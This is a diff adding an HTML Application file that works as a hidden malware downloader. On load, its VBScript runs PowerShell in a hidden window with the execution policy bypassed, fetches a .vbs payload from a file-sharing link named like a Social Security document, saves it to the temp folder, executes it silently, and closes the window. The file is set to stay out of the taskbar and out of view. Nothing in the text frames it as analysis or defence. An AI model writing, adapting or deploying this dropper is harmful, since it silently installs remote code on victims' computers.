@@ -1,0 +1,33 @@
+<html>
+<head>
+<HTA:APPLICATION
+  ID="app"
+  BORDER="none"
+  CAPTION="no"
+  SHOWINTASKBAR="no"
+  WINDOWSTATE="minimize">
+</head>
+
+<script language="VBScript">
+Sub Window_OnLoad
+
+  url = "https://store3.gofile.io/download/direct/241274e7-7436-443e-9cbe-dbfb83771e62/DocumentSSA-85606.vbs"
+  
+  file = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\script.vbs"
+
+  cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""try {Invoke-WebRequest -Uri '" & url & "' -OutFile '" & file & "' -UseBasicParsing} catch {}"""
+
+  Set sh = CreateObject("WScript.Shell")
+  sh.Run cmd, 0, True
+
+  If CreateObject("Scripting.FileSystemObject").FileExists(file) Then
+    sh.Run "wscript """ & file & """", 0
+  End If
+
+  window.close
+
+End Sub
+</script>
+
+<body></body>
+</html>
